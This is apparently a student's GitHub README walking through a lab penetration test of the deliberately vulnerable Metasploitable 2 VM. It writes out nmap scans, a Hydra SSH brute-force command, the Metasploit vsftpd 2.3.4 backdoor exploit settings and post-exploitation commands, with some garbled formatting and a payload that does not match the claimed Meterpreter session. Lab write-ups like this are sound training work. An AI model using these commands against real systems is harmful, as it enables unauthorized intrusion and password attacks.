Practical Exploitation of Metasploitable 2 using Metasploit Framework

**Author:** Hasnain Unar  
**LinkedIn:** [Hasnain Unar](https://www.linkedin.com/in/hasnain-unar-0379383a2/)  
**GitHub:** [Hasnain1675](https://github.com/Hasnain1675)  
**Date:** June 2026

---

## 📋 Project Overview

This project demonstrates a complete ethical penetration testing lifecycle on Metasploitable 2, a deliberately vulnerable Linux machine.

**Target IP:** `10.0.2.4`  
**Attacker IP:** `10.0.2.15` (Kali Linux)

---

## 🎯 Objectives

- Reconnaissance and vulnerability scanning
- Brute force attack on SSH service
- Remote exploitation using Metasploit
- Post-exploitation activities

---

## 🛠️ Lab Setup

- Attacker: Kali Linux (Latest)
- Target: Metasploitable 2 (Ubuntu 8.04)
- Virtualization: Oracle VirtualBox
- Network: Host-Only Adapter

---

## 🔍 Attack Phases

### Phase 1: Reconnaissance
```bash
nmap -sV -O 10.0.2.4
nmap --script vuln 10.0.2.4
Phase 2: Brute Force Attack
Bashhydra -l msfadmin -P /usr/share/wordlists/rockyou.txt -t 4 -vV ssh://10.0.2.4
Phase 3: Exploitation
msfuse exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 10.0.2.4
set LHOST 10.0.2.15
set PAYLOAD cmd/unix/interactive
exploit
Phase 4: Post-Exploitation
meterpretersysinfo
getuid
whoami
shell

📸 Project Screenshots
Reconnaissance Phase
<img src="screenshots/01-nmap-scan.png" alt="Nmap Scan">
<img src="screenshots/02-vuln-scan.png" alt="Vulnerability Scan">
Brute Force Phase
<img src="screenshots/03-hydra-bruteforce.png" alt="Hydra Brute Force Attack">
Exploitation Phase
<img src="screenshots/04-vsftpd-exploit.png" alt="vsftpd Exploit">
<img src="screenshots/05-meterpreter-session.png" alt="Meterpreter Session">
Post-Exploitation
<img src="screenshots/06-sysinfo-whoami.png" alt="System Information">

🛡️ Tools Used

Nmap
Hydra
Metasploit Framework
Meterpreter


🔒 Ethical Note
This project was performed in an isolated virtual lab environment for educational purposes only.

Made with passion for Cybersecurity 🔥
text
